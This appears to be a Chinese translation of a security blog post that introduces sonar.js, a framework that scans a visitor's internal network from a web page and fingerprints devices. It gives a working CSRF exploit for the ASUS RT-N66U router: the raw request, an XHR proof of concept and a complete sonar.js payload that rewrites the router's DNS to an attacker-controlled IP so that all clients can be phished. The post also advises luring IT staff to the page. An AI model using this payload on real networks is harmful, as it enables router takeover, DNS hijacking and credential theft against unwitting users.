@@ -1,0 +1,147 @@
+**最近，WebRTC作为一种使用常规网页扫描内部网络的方式出现在新闻中。我们已经看到了这种功能的一些有趣的应用，比如《纽约时报》扫描你的内部网络来检测机器人。互联网上的随机网页能够扫描你的内部网络来寻找在线主机是可怕的。攻击者可以对你内部网络上的活动主机做什么?如果你有过内网渗透的经验，就会发觉这种情况的可怕之处。许多内部网络充斥着只需要默认凭证就可登陆的设备，一系列的cve漏洞让使用Metasploitable进行渗透看上去很安全，内网中还有那些插在某个角落从未配置过的设备。然而，尽管WebRTC是许多浏览器的一个可怕特性，但我还没有看到任何使用它开发漏洞利用的框架。**
+
+## sonar.js介绍
+
+作为回应，我构建了sonar.js。使用JavaScript、WebRTC和一些onload
+hackery来检测网络上的内部设备的框架。sonar.js的工作原理是利用WebRTC枚举内部网络上的活动主机。在枚举一个活动IP之后，sonar.js尝试链接到静态资源，如CSS、图像和JavaScript，同时挂接onload事件处理程序。如果资源成功加载并触发onload事件，那么我们就知道主机拥有该资源。知道这个有什么用?通过获取驻留在设备上的资源列表，我们可以尝试对该设备进行指纹识别。例如，Linksys
+WRT56G路由器有以下静态资源:
+
+> /UILinksys.gif
+>
+> /UI_10.gif
+>
+> /UI_07.gif
+>
+> /UI_06.gif
+>
+> /UI_03.gif
+>
+> /UI_02.gif
+>
+> /UI_Cisco.gif
+>
+> /style.css
+
+因此，如果我们将所有这些资源都嵌入到我们的页面中，并且它们返回一个成功的onload事件，那么我们就可以肯定这个设备确实是一个Linksys
+WRT54G路由器。sonar.js为我们自动化了这个过程，并允许渗透测试人员为一系列设备构建一个自定义漏洞列表，如果通过上面的方法检测到一个设备，那么就会启动匹配的漏洞。
+
+## 使用sonar.js构建漏洞
+
+现在您已经了解了sonar.js的工作原理，我们用它来构建一个可用的POC。在本练习中，我们尝试将内部网络上的所有请求重新路由到我们自己的恶意DNS服务器。由于网络上的所有客户端都是通过DHCP从路由器获得DNS设置的，所以我们必须对其进行折衷。在真正的攻击中，你会有多个不同型号的路由器的漏洞集合，但目前我们只是要建立华硕RT-N66U
+WiFi路由器的漏洞集合。幸运的是，RT-N66U没有跨站点请求伪造保护，所以我们可以向那些通过路由器认证的人伪造请求。下面是一个更改路由器默认DNS服务器设置的示例请求(这是网络上所有客户端的DNS服务器):
+
+    
+    
+    POST /start_apply.htm HTTP/1.1
+    Host: 192.168.1.1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: http://192.168.1.1/Advanced_DHCP_Content.asp
+    Cookie: apps_last=; dm_install=no; dm_enable=no
+    Authorization: [REDACTED]
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 519
+    
+    productid=RT-N66U&ampcurrent_page=Advanced_DHCP_Content.asp&next_page=Advanced_GWStaticRoute_Content.asp&next_host=192.168.1.1&modified=0&action_mode=apply&action_wait=30&action_script=restart_net_and_phy&first_time=&preferred_lang=EN&firmver=3.0.0.4&lan_ipaddr=192.168.1.1&lan_netmask=255.255.255.0&dhcp_staticlist=&dhcp_enable_x=1&lan_domain=&dhcp_start=192.168.1.2&dhcp_end=192.168.1.254&dhcp_lease=86400&dhcp_gateway_x=&dhcp_dns1_x=8.8.8.8&dhcp_wins_x=&dhcp_static_x=0&dhcp_staticmac_x_0=&dhcp_staticip_x_0=&FAQ_input=
+    
+
+由于上面的请求不包含任何CSRF令牌或来源检查，所以我们可以强制经过身份验证的用户执行请求。使用BurpSuite专业版的用户可以在请求上右键选择“Engagement
+Tools”和单击“Generate CSRF PoC”来生成POC。POC的例子如下:
+
+    
+    
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://192.168.1.1/start_apply.htm", true);
+    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.withCredentials = true;
+    var body = "productid=RT-N66U&ampcurrent_page=Advanced_DHCP_Content.asp&next_page=Advanced_GWStaticRoute_Content.asp&next_host=192.168.1.1&modified=0&action_mode=apply&action_wait=30&action_script=restart_net_and_phy&first_time=&preferred_lang=EN&firmver=3.0.0.4&lan_ipaddr=192.168.1.1&lan_netmask=255.255.255.0&dhcp_staticlist=&dhcp_enable_x=1&lan_domain=&dhcp_start=192.168.1.2&dhcp_end=192.168.1.254&dhcp_lease=86400&dhcp_gateway_x=&dhcp_dns1_x=8.8.8.8&dhcp_wins_x=&dhcp_static_x=0&dhcp_staticmac_x_0=&dhcp_staticip_x_0=&FAQ_input=";
+    var aBody = new Uint8Array(body.length);
+    for (var i = 0; i < aBody.length; i++)
+      aBody[i] = body.charCodeAt(i);
+    xhr.send(new Blob([aBody]));
+    
+
+现在我们的目标路由器有一个漏洞——那么我们如何将它集成到sonar.js中呢?首先，我们需要创建一个sonar.js指纹，下面的代码片段显示了这种指纹的格式:
+
+    
+    
+    var fingerprints = [
+        {
+            'name': "ASUS RT-N66U",
+            'fingerprints': ["/images/New_ui/asustitle.png","/images/loading.gif","/images/alertImg.png","/images/New_ui/networkmap/line_one.png","/images/New_ui/networkmap/lock.png","/images/New_ui/networkmap/line_two.png","/index_style.css","/form_style.css","/NM_style.css","/other.css"],
+            'callback': function( ip ) {
+                // Exploit code here
+            },
+        },
+    ]
+    
+
+手动创建指纹可能会很痛苦，我还建了一个Chrome扩展，它将根据当前页面生成指纹。可在此下载:
+
+    
+    
+    https://chrome.google.com/webstore/detail/sonar-fingerprint-generat/pmijnndljolchjlfcncaeoejfpjjagef
+    
+
+![](https://image.3001.net/images/20190620/1561019352_5d0b43d85c5c8.png!small)如前所述，sonar.js通过链接到主机上的静态资源来枚举它。JavaScript对象的fingerprints字段包含我们已知的存在于每个ASUS
+RT-N66U路由器上的静态资源数组。例如，我们知道图像 `/images/New_ui/asustitle.png`是RT-N66U web
+UI主菜单的一部分。在枚举IP地址之后，sonar.js将尝试链接到上面的资源，同时挂接onload事件处理程序，检查它们是否成功加载。如果上述所有资源都成功加载，那么sonar.js将调用callback(ip)函数来启动攻击。所以，对我们的攻击脚本做小小的修改，我们就有了有效的sonar.js载荷:
+
+    
+    
+    var fingerprints = [
+        {
+            'name': "ASUS RT-N66U",
+            'fingerprints': ["/images/New_ui/asustitle.png","/images/loading.gif","/images/alertImg.png","/images/New_ui/networkmap/line_one.png","/images/New_ui/networkmap/lock.png","/images/New_ui/networkmap/line_two.png","/index_style.css","/form_style.css","/NM_style.css","/other.css"],
+            'callback': function( ip ) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://" + ip + "/start_apply.htm", true);
+                xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+                xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.withCredentials = true;
+                var body = "productid=RT-N66U&ampcurrent_page=Advanced_DHCP_Content.asp&next_page=Advanced_GWStaticRoute_Content.asp&next_host=" + ip + "&modified=0&action_mode=apply&action_wait=30&action_script=restart_net_and_phy&first_time=&preferred_lang=EN&firmver=3.0.0.4&lan_ipaddr=" + ip + "&lan_netmask=255.255.255.0&dhcp_staticlist=&dhcp_enable_x=1&lan_domain=&dhcp_start=192.168.1.2&dhcp_end=192.168.1.254&dhcp_lease=86400&dhcp_gateway_x=&dhcp_dns1_x=23.92.52.47&dhcp_wins_x=&dhcp_static_x=0&dhcp_staticmac_x_0=&dhcp_staticip_x_0=&FAQ_input=";
+                var aBody = new Uint8Array(body.length);
+                for (var i = 0; i < aBody.length; i++)
+                  aBody[i] = body.charCodeAt(i);
+                xhr.send(new Blob([aBody]));
+            },
+        },
+    }
+    
+
+然后将指纹数据库加载到sonar.js中:
+
+    
+    
+    <!DOCTYPE html>
+    <html>
+        <head>
+        </head>
+        <body>
+            <script src="sonar.js"></script>
+            <script src="fingerprint_db.js"></script>
+            <script>
+                // Sonar.js loading a fingerprint database from fingerprint_db.js
+                sonar.load_fingerprints( fingerprints );
+                sonar.start();
+            </script>
+        </body>
+    </html>
+    
+
+现在我们有一个有效的漏洞攻击脚本!下一步是把这个有效载荷发送给我们的受害者。这将有利于目标用户与路由器访问，如It人员或系统管理员。当用户点击到sonar.js网页有效负载的链接时，内部网络将被扫描到华硕RT-N66U路由器，一旦发现路由器存在漏洞，就会对其发起攻击。要展示这种有效载荷的实际例子，请参见以下视频:
+
+您可以看到，由于RT-N66U路由器中的一个简单的跨站点请求伪造漏洞，我们劫持了内部网络上的所有DNS请求。现在我们已经控制了网络的DNS，我们可以将请求重定向到诸如`<http://legitbank.com>`这样的钓鱼页面。可以说，当你控制DNS时，游戏就差不多结束了。
+
+## sonar.js项目
+
+我们现在可以针对一系列设备构建漏洞，而sonar.js将帮助我们将这些漏洞发送到内部网络。目前，sonar.js指纹数据库仅限于少数设备的少量指纹。我们需要你的帮助来完善这个项目!有关生成指纹和利用sonar构建攻击脚本的更多信息，请参见以下Github项目:<https://github.com/mandatoryprogrammer/sonar.js>
+
+*参考来源：[thehackerblog](https://thehackerblog.com/sonar-a-framework-for-scanning-and-exploiting-internal-hosts-with-a-webpage/)，Zzzxbug编译整理，转载请注明来自 FreeBuf.COM。
+
